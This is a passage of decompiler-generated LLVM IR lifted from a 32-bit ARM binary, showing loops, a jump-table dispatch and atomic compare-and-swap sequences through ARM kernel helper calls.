dec_label_pc_d964:                                ; preds = %dec_label_pc_d8c0
  %v0_d968 = load i32, i32* @r4, align 4
  %v2_d968 = add i32 %v0_d968, -33996
  store i32 %v2_d968, i32* @r0, align 4
  %v1_d96c = call i32 @function_fb70(i32 %v2_d968)
  store i32 %v1_d96c, i32* @r6, align 4
  %v2_d970 = icmp eq i32 %v1_d96c, 0
  br i1 %v2_d970, label %bb19, label %dec_label_pc_d97c

bb19:                                             ; preds = %dec_label_pc_d964
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_d9c8

dec_label_pc_d97c:                                ; preds = %dec_label_pc_d964
  %v0_d980 = load i32, i32* @r4, align 4
  %v2_d980 = add i32 %v0_d980, -33980
  store i32 %v2_d980, i32* @r8, align 4
  %v2_d988 = add i32 %v0_d980, -33944
  store i32 %v2_d988, i32* @r7, align 4
  %v2_d98c = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_d98c, i32* @r4, align 4
  br label %bb21

dec_label_pc_d994:                                ; preds = %bb21
  %v0_d9c0 = load i32, i32* @r8, align 4
  %v3_d994 = load i32, i32* %stack_var_-36, align 4
  %v1_d998 = inttoptr i32 %v3_d994 to i32*
  %v2_d998 = load i32, i32* %v1_d998, align 4
  store i32 %v2_d998, i32* @r1, align 4
  %v2_d99c = inttoptr i32 %v0_d9c0 to i8*
  %v3_d99c = call i32 @function_114a0(i8* %v2_d99c, i32 %v2_d998)
  %v2_d9a0 = icmp eq i32 %v3_d99c, 0
  br i1 %v2_d9a0, label %bb20, label %.backedge

bb20:                                             ; preds = %dec_label_pc_d994
  %v1_d9a4 = load i32, i32* @r5, align 4
  %v2_d9a4 = add i32 %v1_d9a4, 1
  store i32 %v2_d9a4, i32* @r5, align 4
  br label %.backedge

.backedge:                                        ; preds = %bb20, %dec_label_pc_d994
  %v0_d9b0.pre = load i32, i32* @r7, align 4
  %v0_d9b4.pre = load i32, i32* @r6, align 4
  br label %bb21

bb21:                                             ; preds = %.backedge, %dec_label_pc_d97c
  %v0_d9b4 = phi i32 [ %v0_d9b4.pre, %.backedge ], [ %v1_d96c, %dec_label_pc_d97c ]
  %v0_d9b0 = phi i32 [ %v0_d9b0.pre, %.backedge ], [ %v2_d988, %dec_label_pc_d97c ]
  %v4_d9b8 = inttoptr i32 %v0_d9b4 to i32*
  %v5_d9b8 = call i32 @function_f814(i32* %v4_d9b8, i32 %v2_d98c, i32 459266, i32 %v0_d9b0)
  %v2_d9bc = icmp eq i32 %v5_d9b8, 0
  br i1 %v2_d9bc, label %dec_label_pc_d9c8, label %dec_label_pc_d994

dec_label_pc_d9c8:                                ; preds = %bb18, %bb21, %bb19
  %v0_d9c8 = load i32, i32* @r6, align 4
  %v1_d9cc = inttoptr i32 %v0_d9c8 to i32*
  %v2_d9cc = call i32 @function_fb3c(i32* %v1_d9cc)
  %v0_d9d0 = load i32, i32* @r5, align 4
  %v2_d9d0 = icmp eq i32 %v0_d9d0, 0
  %.v0_d9d0 = select i1 %v2_d9d0, i32 1, i32 %v0_d9d0
  ret i32 %.v0_d9d0

; uselistorder directives
  uselistorder i32* %stack_var_-36, { 0, 3, 1, 4, 2 }
  uselistorder i8 117, { 1, 0 }
  uselistorder i8 99, { 1, 0 }
  uselistorder i32 (i32)* @function_fb70, { 1, 0 }
  uselistorder label %dec_label_pc_d9c8, { 1, 2, 0 }
  uselistorder label %.backedge3, { 0, 1, 4, 3, 2 }
}

define i32 @function_da0c(i32 %arg1) local_unnamed_addr {
dec_label_pc_da0c:
  %r1.global-to-local = alloca i32, align 4
  %tmp = icmp ult i32 %arg1, 241
  br i1 %tmp, label %bb, label %dec_label_pc_ddfc

bb:                                               ; preds = %dec_label_pc_da0c
  %v7_da20 = mul i32 %arg1, 4
  %v8_da20 = add i32 %v7_da20, ptrtoint (i32* @global_var_da28.338 to i32)
  call void @__pseudo_branch(i32 %v8_da20)
  br label %dec_label_pc_ddfc

dec_label_pc_ddfc:                                ; preds = %bb, %dec_label_pc_da0c
  %v0_de00 = call i32 @function_f150()
  %v3_de04 = load i16, i16* @global_var_1d2d8.209, align 2
  %v4_de04 = sext i16 %v3_de04 to i32
  store i32 -1, i32* %r1.global-to-local, align 4
  %v3_de10 = add i32 %v4_de04, %v0_de00
  %v4_de10 = inttoptr i32 %v3_de10 to i32*
  store i32 22, i32* %v4_de10, align 4
  %v0_dff4 = load i32, i32* %r1.global-to-local, align 4
  ret i32 %v0_dff4

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @function_e030() local_unnamed_addr {
dec_label_pc_e030:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-104 = alloca i32, align 4
  %stack_var_-88 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v3_e034 = load i32, i32* @r4, align 4
  %v9_e034 = load i32, i32* @r6, align 4
  %v12_e034 = load i32, i32* @r7, align 4
  %v15_e034 = load i32, i32* @r8, align 4
  %v18_e034 = load i32, i32* @sb, align 4
  %v21_e034 = load i32, i32* @sl, align 4
  %v24_e034 = load i32, i32* @fp, align 4
  %v31_e034 = load i32, i32* @lr, align 4
  store i32 57404, i32* %stack_var_-4, align 4
  store i32 12464, i32* %r5.global-to-local, align 4
  %v2_e040 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_e040, i32* @fp, align 4
  store i32 ptrtoint (i32* @global_var_1d280.213 to i32), i32* @r8, align 4
  %v4_e12017 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_1d280.213 to i32), i32 12464) to i32*), align 4
  store i32 %v4_e12017, i32* %r7.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_e12419 = icmp eq i32 %v4_e12017, 0
  br i1 %v2_e12419, label %dec_label_pc_e12c, label %dec_label_pc_e050

dec_label_pc_e050:                                ; preds = %dec_label_pc_e030, %dec_label_pc_e120.backedge
  call void @__pseudo_branch(i32 -61536)
  %v0_e05c = load i32, i32* %r7.global-to-local, align 4
  %v1_e05c = add i32 %v0_e05c, 20
  %v2_e05c = inttoptr i32 %v1_e05c to i32*
  %v3_e05c = load i32, i32* %v2_e05c, align 4
  store i32 %v3_e05c, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_e060 = icmp eq i32 %v3_e05c, 0
  store i32 %v3_e05c, i32* %r4.global-to-local, align 4
  %v1_e068 = add i32 %v3_e05c, 1
  store i32 %v1_e068, i32* %r1.global-to-local, align 4
  br i1 %v2_e060, label %dec_label_pc_e120.backedge, label %dec_label_pc_e070

dec_label_pc_e120.backedge:                       ; preds = %dec_label_pc_e050, %dec_label_pc_e09c
  %v0_e120 = load i32, i32* @r8, align 4
  %v1_e120 = load i32, i32* %r5.global-to-local, align 4
  %v2_e120 = add i32 %v1_e120, %v0_e120
  %v3_e120 = inttoptr i32 %v2_e120 to i32*
  %v4_e120 = load i32, i32* %v3_e120, align 4
  store i32 %v4_e120, i32* %r7.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_e124 = icmp eq i32 %v4_e120, 0
  br i1 %v2_e124, label %dec_label_pc_e12c, label %dec_label_pc_e050

dec_label_pc_e070:                                ; preds = %dec_label_pc_e050
  %v0_e070 = load i32, i32* @r8, align 4
  %v1_e070 = load i32, i32* %r5.global-to-local, align 4
  %v2_e070 = add i32 %v1_e070, %v0_e070
  %v3_e070 = inttoptr i32 %v2_e070 to i32*
  %v4_e070 = load i32, i32* %v3_e070, align 4
  %v1_e074 = add i32 %v4_e070, 20
  store i32 %v1_e074, i32* %r2.global-to-local, align 4
  %v1_e078171 = inttoptr i32 %v1_e074 to i32*
  %v2_e078172 = load i32, i32* %v1_e078171, align 4
  store i32 %v2_e078172, i32* %r3.global-to-local, align 4
  %v3_e07c174 = icmp uge i32 %v2_e078172, %v3_e05c
  store i1 %v3_e07c174, i1* %cpsr_c.global-to-local, align 1
  %v9_e07c180 = icmp eq i32 %v2_e078172, %v3_e05c
  br i1 %v9_e07c180, label %dec_label_pc_e084, label %dec_label_pc_e09c

dec_label_pc_e084:                                ; preds = %dec_label_pc_e070, %dec_label_pc_e084.dec_label_pc_e078_crit_edge
  %v0_e084181 = phi i32 [ %v1_e07c.pre, %dec_label_pc_e084.dec_label_pc_e078_crit_edge ], [ %v3_e05c, %dec_label_pc_e070 ]
  store i32 %v0_e084181, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_e094 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_e094, label %dec_label_pc_e098, label %dec_label_pc_e084.dec_label_pc_e078_crit_edge

dec_label_pc_e084.dec_label_pc_e078_crit_edge:    ; preds = %dec_label_pc_e084
  %v0_e078.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_e07c.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_e078 = inttoptr i32 %v0_e078.pre to i32*
  %v2_e078 = load i32, i32* %v1_e078, align 4
  store i32 %v2_e078, i32* %r3.global-to-local, align 4
  %v3_e07c = icmp uge i32 %v2_e078, %v1_e07c.pre
  store i1 %v3_e07c, i1* %cpsr_c.global-to-local, align 1
  %v9_e07c = icmp eq i32 %v2_e078, %v1_e07c.pre
  br i1 %v9_e07c, label %dec_label_pc_e084, label %dec_label_pc_e09c

dec_label_pc_e098:                                ; preds = %dec_label_pc_e084
  %v0_e098 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_e098, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_e09c

dec_label_pc_e09c:                                ; preds = %dec_label_pc_e070, %dec_label_pc_e084.dec_label_pc_e078_crit_edge, %dec_label_pc_e098
  %v0_e09c = phi i32 [ %v0_e098, %dec_label_pc_e098 ], [ %v2_e078172, %dec_label_pc_e070 ], [ %v2_e078, %dec_label_pc_e084.dec_label_pc_e078_crit_edge ]
  %v1_e09c = phi i32 [ %v0_e098, %dec_label_pc_e098 ], [ %v3_e05c, %dec_label_pc_e070 ], [ %v1_e07c.pre, %dec_label_pc_e084.dec_label_pc_e078_crit_edge ]
  %v3_e09c = icmp uge i32 %v0_e09c, %v1_e09c
  store i1 %v3_e09c, i1* %cpsr_c.global-to-local, align 1
  %v9_e09c = icmp eq i32 %v0_e09c, %v1_e09c
  br i1 %v9_e09c, label %dec_label_pc_e0a4, label %dec_label_pc_e120.backedge

dec_label_pc_e0a4:                                ; preds = %dec_label_pc_e09c
  store i32 0, i32* %r4.global-to-local, align 4
  %v2_e0b8 = ptrtoint i32* %stack_var_-88 to i32
  br label %dec_label_pc_e0a8

dec_label_pc_e0a8:                                ; preds = %dec_label_pc_e110, %dec_label_pc_e0a4
  %v0_e0a8 = load i32, i32* %r7.global-to-local, align 4
  %v1_e0a8 = add i32 %v0_e0a8, 4
  %v2_e0a8 = inttoptr i32 %v1_e0a8 to i32*
  %v3_e0a8 = load i32, i32* %v2_e0a8, align 4
  store i32 %v3_e0a8, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_e0ac = icmp eq i32 %v3_e0a8, 0
  br i1 %v2_e0ac, label %bb86, label %bb

bb:                                               ; preds = %dec_label_pc_e0a8
  br label %bb86

bb86:                                             ; preds = %dec_label_pc_e0a8, %bb
  %v2_e0b4 = xor i1 %v2_e0ac, true
  call void @__pseudo_cond_branch(i1 %v2_e0b4, i32 %v3_e0a8)
  %v0_e0bc = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_e0bc, i32* %stack_var_-88, align 4
  %v1_e0c0 = inttoptr i32 %v0_e0bc to i32*
  %v2_e0c0 = load i32, i32* %v1_e0c0, align 4
  store i32 %v2_e0c0, i32* %r7.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_e0c4 = icmp eq i32 %v2_e0c0, 0
  store i32 %v2_e0b8, i32* %r5.global-to-local, align 4
  br i1 %v2_e0c4, label %dec_label_pc_e130.loopexit, label %dec_label_pc_e0d8

dec_label_pc_e0d8:                                ; preds = %bb86
  %v1_e0d8 = add i32 %v2_e0c0, 20
  store i32 %v1_e0d8, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_e0dc

dec_label_pc_e0dc:                                ; preds = %dec_label_pc_e110.dec_label_pc_e0dc_crit_edge, %dec_label_pc_e0d8
  %v0_e0e0 = phi i32 [ %v0_e0e0.pre, %dec_label_pc_e110.dec_label_pc_e0dc_crit_edge ], [ %v1_e0d8, %dec_label_pc_e0d8 ]
  %v0_e0dc = phi i32 [ %v0_e0dc.pre, %dec_label_pc_e110.dec_label_pc_e0dc_crit_edge ], [ %v2_e0c0, %dec_label_pc_e0d8 ]
  %v1_e0dc = add i32 %v0_e0dc, 20
  %v2_e0dc = inttoptr i32 %v1_e0dc to i32*
  %v3_e0dc = load i32, i32* %v2_e0dc, align 4
  store i32 %v0_e0e0, i32* %r2.global-to-local, align 4
  store i32 %v3_e0dc, i32* %r4.global-to-local, align 4
  %v1_e0e8 = add i32 %v3_e0dc, 1
  store i32 %v1_e0e8, i32* %r1.global-to-local, align 4
  %v1_e0ec158 = inttoptr i32 %v0_e0e0 to i32*
  %v2_e0ec159 = load i32, i32* %v1_e0ec158, align 4
  store i32 %v2_e0ec159, i32* %r3.global-to-local, align 4
  %v3_e0f0161 = icmp uge i32 %v2_e0ec159, %v3_e0dc
  store i1 %v3_e0f0161, i1* %cpsr_c.global-to-local, align 1
  %v9_e0f0167 = icmp eq i32 %v2_e0ec159, %v3_e0dc
  br i1 %v9_e0f0167, label %dec_label_pc_e0f8, label %dec_label_pc_e110

dec_label_pc_e0f8:                                ; preds = %dec_label_pc_e0dc, %dec_label_pc_e0f8.dec_label_pc_e0ec_crit_edge
  %v0_e0f8168 = phi i32 [ %v1_e0f0.pre, %dec_label_pc_e0f8.dec_label_pc_e0ec_crit_edge ], [ %v3_e0dc, %dec_label_pc_e0dc ]
  store i32 %v0_e0f8168, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_e108 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_e108, label %dec_label_pc_e10c, label %dec_label_pc_e0f8.dec_label_pc_e0ec_crit_edge

dec_label_pc_e0f8.dec_label_pc_e0ec_crit_edge:    ; preds = %dec_label_pc_e0f8
  %v0_e0ec.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_e0f0.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_e0ec = inttoptr i32 %v0_e0ec.pre to i32*
  %v2_e0ec = load i32, i32* %v1_e0ec, align 4
  store i32 %v2_e0ec, i32* %r3.global-to-local, align 4
  %v3_e0f0 = icmp uge i32 %v2_e0ec, %v1_e0f0.pre
  store i1 %v3_e0f0, i1* %cpsr_c.global-to-local, align 1
  %v9_e0f0 = icmp eq i32 %v2_e0ec, %v1_e0f0.pre
  br i1 %v9_e0f0, label %dec_label_pc_e0f8, label %dec_label_pc_e110

dec_label_pc_e10c:                                ; preds = %dec_label_pc_e0f8
  %v0_e10c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_e10c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_e110

dec_label_pc_e110:                                ; preds = %dec_label_pc_e0dc, %dec_label_pc_e0f8.dec_label_pc_e0ec_crit_edge, %dec_label_pc_e10c
  %v0_e110 = phi i32 [ %v0_e10c, %dec_label_pc_e10c ], [ %v2_e0ec159, %dec_label_pc_e0dc ], [ %v2_e0ec, %dec_label_pc_e0f8.dec_label_pc_e0ec_crit_edge ]
  %v1_e110 = phi i32 [ %v0_e10c, %dec_label_pc_e10c ], [ %v3_e0dc, %dec_label_pc_e0dc ], [ %v1_e0f0.pre, %dec_label_pc_e0f8.dec_label_pc_e0ec_crit_edge ]
  %v3_e110 = icmp uge i32 %v0_e110, %v1_e110
  store i1 %v3_e110, i1* %cpsr_c.global-to-local, align 1
  %v9_e110 = icmp eq i32 %v0_e110, %v1_e110
  store i32 %v2_e0b8, i32* %r4.global-to-local, align 4
  br i1 %v9_e110, label %dec_label_pc_e0a8, label %dec_label_pc_e110.dec_label_pc_e0dc_crit_edge

dec_label_pc_e110.dec_label_pc_e0dc_crit_edge:    ; preds = %dec_label_pc_e110
  %v0_e0dc.pre = load i32, i32* %r7.global-to-local, align 4
  %v0_e0e0.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_e0dc

dec_label_pc_e12c:                                ; preds = %dec_label_pc_e120.backedge, %dec_label_pc_e030
  %v0_e13432 = phi i32 [ ptrtoint (i32* @global_var_1d280.213 to i32), %dec_label_pc_e030 ], [ %v0_e120, %dec_label_pc_e120.backedge ]
  store i32 0, i32* @r6, align 4
  br label %dec_label_pc_e130

dec_label_pc_e130.loopexit:                       ; preds = %bb86
  store i32 %v2_e0b8, i32* @r6, align 4
  %v0_e134.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_e130

dec_label_pc_e130:                                ; preds = %dec_label_pc_e130.loopexit, %dec_label_pc_e12c
  %v0_e134 = phi i32 [ %v0_e134.pre, %dec_label_pc_e130.loopexit ], [ %v0_e13432, %dec_label_pc_e12c ]
  store i32 152, i32* %r3.global-to-local, align 4
  %v2_e134 = add i32 %v0_e134, 152
  %v3_e134 = inttoptr i32 %v2_e134 to i32*
  %v4_e134 = load i32, i32* %v3_e134, align 4
  store i32 %v4_e134, i32* %r7.global-to-local, align 4
  %v0_e138 = call i32 @function_f150()
  store i32 %v0_e138, i32* %r0.global-to-local, align 4
  %v1_e13c = add i32 %v4_e134, 8
  %v2_e13c = inttoptr i32 %v1_e13c to i32*
  %v3_e13c = load i32, i32* %v2_e13c, align 4
  store i32 %v3_e13c, i32* %r3.global-to-local, align 4
  %v1_e140 = add i32 %v0_e138, -1168
  store i32 %v1_e140, i32* %r5.global-to-local, align 4
  %v3_e144 = icmp uge i32 %v3_e13c, %v1_e140
  store i1 %v3_e144, i1* %cpsr_c.global-to-local, align 1
  %v9_e144 = icmp eq i32 %v3_e13c, %v1_e140
  br i1 %v9_e144, label %dec_label_pc_e2ac, label %dec_label_pc_e14c

dec_label_pc_e14c:                                ; preds = %dec_label_pc_e130
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v4_e134, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v1_e158151 = inttoptr i32 %v4_e134 to i32*
  %v2_e158152 = load i32, i32* %v1_e158151, align 4
  store i32 %v2_e158152, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_e15c154 = icmp eq i32 %v2_e158152, 0
  br i1 %v9_e15c154, label %dec_label_pc_e164, label %dec_label_pc_e17c

dec_label_pc_e164:                                ; preds = %dec_label_pc_e14c, %dec_label_pc_e164.dec_label_pc_e158_crit_edge
  %v0_e164155 = phi i32 [ %v1_e15c.pre, %dec_label_pc_e164.dec_label_pc_e158_crit_edge ], [ 0, %dec_label_pc_e14c ]
  store i32 %v0_e164155, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_e174 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_e174, label %dec_label_pc_e178, label %dec_label_pc_e164.dec_label_pc_e158_crit_edge

dec_label_pc_e164.dec_label_pc_e158_crit_edge:    ; preds = %dec_label_pc_e164
  %v0_e158.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_e15c.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_e158 = inttoptr i32 %v0_e158.pre to i32*
  %v2_e158 = load i32, i32* %v1_e158, align 4
  store i32 %v2_e158, i32* %r3.global-to-local, align 4
  %v3_e15c = icmp uge i32 %v2_e158, %v1_e15c.pre
  store i1 %v3_e15c, i1* %cpsr_c.global-to-local, align 1
  %v9_e15c = icmp eq i32 %v2_e158, %v1_e15c.pre
  br i1 %v9_e15c, label %dec_label_pc_e164, label %dec_label_pc_e17c

dec_label_pc_e178:                                ; preds = %dec_label_pc_e164
  %v0_e178 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_e178, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_e17c

dec_label_pc_e17c:                                ; preds = %dec_label_pc_e14c, %dec_label_pc_e164.dec_label_pc_e158_crit_edge, %dec_label_pc_e178
  %v0_e17c = phi i32 [ %v0_e178, %dec_label_pc_e178 ], [ %v2_e158152, %dec_label_pc_e14c ], [ %v2_e158, %dec_label_pc_e164.dec_label_pc_e158_crit_edge ]
  %v3_e3fc = phi i32 [ %v0_e178, %dec_label_pc_e178 ], [ 0, %dec_label_pc_e14c ], [ %v1_e15c.pre, %dec_label_pc_e164.dec_label_pc_e158_crit_edge ]
  %v3_e17c = icmp uge i32 %v0_e17c, %v3_e3fc
  store i1 %v3_e17c, i1* %cpsr_c.global-to-local, align 1
  %v9_e17c = icmp eq i32 %v0_e17c, %v3_e3fc
  br i1 %v9_e17c, label %dec_label_pc_e188, label %dec_label_pc_e3fc

dec_label_pc_e188:                                ; preds = %dec_label_pc_e17c
  %v1_e188.pre = load i32, i32* %r7.global-to-local, align 4
  %v0_e188 = load i32, i32* %r5.global-to-local, align 4
  %v2_e188 = add i32 %v1_e188.pre, 8
  %v3_e188 = inttoptr i32 %v2_e188 to i32*
  store i32 %v0_e188, i32* %v3_e188, align 4
  br label %dec_label_pc_e2ac

dec_label_pc_e2ac:                                ; preds = %dec_label_pc_e188, %dec_label_pc_e130
  store i32 152, i32* %r3.global-to-local, align 4
  %v0_e190 = load i32, i32* @r8, align 4
  %v2_e190 = add i32 %v0_e190, 152
  %v3_e190 = inttoptr i32 %v2_e190 to i32*
  %v4_e190 = load i32, i32* %v3_e190, align 4
  store i32 %v4_e190, i32* %r2.global-to-local, align 4
  %v1_e194 = add i32 %v4_e190, 4
  %v2_e194 = inttoptr i32 %v1_e194 to i32*
  %v3_e194 = load i32, i32* %v2_e194, align 4
  %v1_e198 = add i32 %v3_e194, 1
  store i32 %v1_e198, i32* %r3.global-to-local, align 4
  store i32 %v1_e198, i32* %v2_e194, align 4
  %v0_e1a0 = load i32, i32* %r5.global-to-local, align 4
  %v1_e1a0 = add i32 %v0_e1a0, 108
  %v2_e1a0 = inttoptr i32 %v1_e1a0 to i32*
  %v3_e1a0 = load i32, i32* %v2_e1a0, align 4
  store i32 %v3_e1a0, i32* %sl.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  %v1_e1a8 = sub i32 0, %v3_e1a0
  store i32 %v1_e1a8, i32* %v2_e1a0, align 4
  store i32 18874385, i32* %r0.global-to-local, align 4
  %v0_e1bc = load i32, i32* %r5.global-to-local, align 4
  %v1_e1bc = add i32 %v0_e1bc, 104
  store i32 %v1_e1bc, i32* %r4.global-to-local, align 4
  store i32 120, i32* %r7.global-to-local, align 4
  store i32 18874385, i32* %r2.global-to-local, align 4
  store i32 18874385, i32* %sb.global-to-local, align 4
  %v0_e2b0.pre = load i32, i32* %sl.global-to-local, align 4
  store i32 152, i32* %r3.global-to-local, align 4
  %v2_e2b0 = add i32 %v0_e1bc, 108
  %v3_e2b0 = inttoptr i32 %v2_e2b0 to i32*
  store i32 %v0_e2b0.pre, i32* %v3_e2b0, align 4
  %v0_e2b4 = load i32, i32* @r8, align 4
  %v1_e2b4 = load i32, i32* %r3.global-to-local, align 4
  %v2_e2b4 = add i32 %v1_e2b4, %v0_e2b4
  %v3_e2b4 = inttoptr i32 %v2_e2b4 to i32*
  %v4_e2b4 = load i32, i32* %v3_e2b4, align 4
  store i32 %v4_e2b4, i32* %r0.global-to-local, align 4
  %v1_e2b8 = add i32 %v4_e2b4, 4
  %v2_e2b8 = inttoptr i32 %v1_e2b8 to i32*
  %v3_e2b8 = load i32, i32* %v2_e2b8, align 4
  %v1_e2bc = add i32 %v3_e2b8, -1
  store i32 %v1_e2bc, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_e2c0 = icmp eq i32 %v1_e2bc, 0
  store i32 %v1_e2bc, i32* %v2_e2b8, align 4
  br i1 %v2_e2c0, label %dec_label_pc_e2cc, label %dec_label_pc_e3bcthread-pre-split

dec_label_pc_e2cc:                                ; preds = %dec_label_pc_e2ac
  %v0_e2cc = load i32, i32* %r3.global-to-local, align 4
  %v1_e2cc = load i32, i32* %r0.global-to-local, align 4
  %v2_e2cc = add i32 %v1_e2cc, 8
  %v3_e2cc = inttoptr i32 %v2_e2cc to i32*
  store i32 %v0_e2cc, i32* %v3_e2cc, align 4
  %v0_e2d0 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_e2d0, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_e2d4

dec_label_pc_e2d4:                                ; preds = %dec_label_pc_e304.dec_label_pc_e2d4_crit_edge, %dec_label_pc_e2cc
  %v0_e2d4 = phi i32 [ %v0_e2d4.pre, %dec_label_pc_e304.dec_label_pc_e2d4_crit_edge ], [ %v0_e2d0, %dec_label_pc_e2cc ]
  %v1_e2d4 = inttoptr i32 %v0_e2d4 to i32*
  %v2_e2d4 = load i32, i32* %v1_e2d4, align 4
  store i32 %v2_e2d4, i32* %r4.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 %v0_e2d4, i32* %r2.global-to-local, align 4
  %v2_e2e0115 = load i32, i32* %v1_e2d4, align 4
  store i32 %v2_e2e0115, i32* %r3.global-to-local, align 4
  %v3_e2e4117 = icmp uge i32 %v2_e2e0115, %v2_e2d4
  store i1 %v3_e2e4117, i1* %cpsr_c.global-to-local, align 1
  %v9_e2e4123 = icmp eq i32 %v2_e2e0115, %v2_e2d4
  br i1 %v9_e2e4123, label %dec_label_pc_e2ec, label %dec_label_pc_e304

dec_label_pc_e2ec:                                ; preds = %dec_label_pc_e2d4, %dec_label_pc_e2ec.dec_label_pc_e2e0_crit_edge
  %v0_e2ec124 = phi i32 [ %v1_e2e4.pre, %dec_label_pc_e2ec.dec_label_pc_e2e0_crit_edge ], [ %v2_e2d4, %dec_label_pc_e2d4 ]
  store i32 %v0_e2ec124, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_e2fc = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_e2fc, label %dec_label_pc_e300, label %dec_label_pc_e2ec.dec_label_pc_e2e0_crit_edge

dec_label_pc_e2ec.dec_label_pc_e2e0_crit_edge:    ; preds = %dec_label_pc_e2ec
  %v0_e2e0.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_e2e4.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_e2e0 = inttoptr i32 %v0_e2e0.pre to i32*
  %v2_e2e0 = load i32, i32* %v1_e2e0, align 4
  store i32 %v2_e2e0, i32* %r3.global-to-local, align 4
  %v3_e2e4 = icmp uge i32 %v2_e2e0, %v1_e2e4.pre
  store i1 %v3_e2e4, i1* %cpsr_c.global-to-local, align 1
  %v9_e2e4 = icmp eq i32 %v2_e2e0, %v1_e2e4.pre
  br i1 %v9_e2e4, label %dec_label_pc_e2ec, label %dec_label_pc_e304

dec_label_pc_e300:                                ; preds = %dec_label_pc_e2ec
  %v0_e300 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_e300, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_e304

dec_label_pc_e304:                                ; preds = %dec_label_pc_e2d4, %dec_label_pc_e2ec.dec_label_pc_e2e0_crit_edge, %dec_label_pc_e300
  %v0_e30c = phi i32 [ %v0_e300, %dec_label_pc_e300 ], [ %v2_e2e0115, %dec_label_pc_e2d4 ], [ %v2_e2e0, %dec_label_pc_e2ec.dec_label_pc_e2e0_crit_edge ]
  %v1_e304 = phi i32 [ %v0_e300, %dec_label_pc_e300 ], [ %v2_e2d4, %dec_label_pc_e2d4 ], [ %v1_e2e4.pre, %dec_label_pc_e2ec.dec_label_pc_e2e0_crit_edge ]
  %v3_e304 = icmp uge i32 %v0_e30c, %v1_e304
  store i1 %v3_e304, i1* %cpsr_c.global-to-local, align 1
  %v9_e304 = icmp eq i32 %v0_e30c, %v1_e304
  br i1 %v9_e304, label %dec_label_pc_e30c, label %dec_label_pc_e304.dec_label_pc_e2d4_crit_edge

dec_label_pc_e304.dec_label_pc_e2d4_crit_edge:    ; preds = %dec_label_pc_e304
  %v0_e2d4.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_e2d4

dec_label_pc_e30c:                                ; preds = %dec_label_pc_e304
  %v2_e30c = icmp ne i32 %v1_e304, 0
  store i1 %v2_e30c, i1* %cpsr_c.global-to-local, align 1
  %v7_e310 = icmp slt i32 %v1_e304, 2
  br i1 %v7_e310, label %dec_label_pc_e3bcthread-pre-split, label %dec_label_pc_e314

dec_label_pc_e314:                                ; preds = %dec_label_pc_e30c
  %v0_e314 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_e314, i32* %r0.global-to-local, align 4
  %v0_e318 = load i32, i32* @r1, align 4
  %v1_e318 = add i32 %v0_e318, 129
  store i32 %v1_e318, i32* @r1, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 240, i32* %r7.global-to-local, align 4
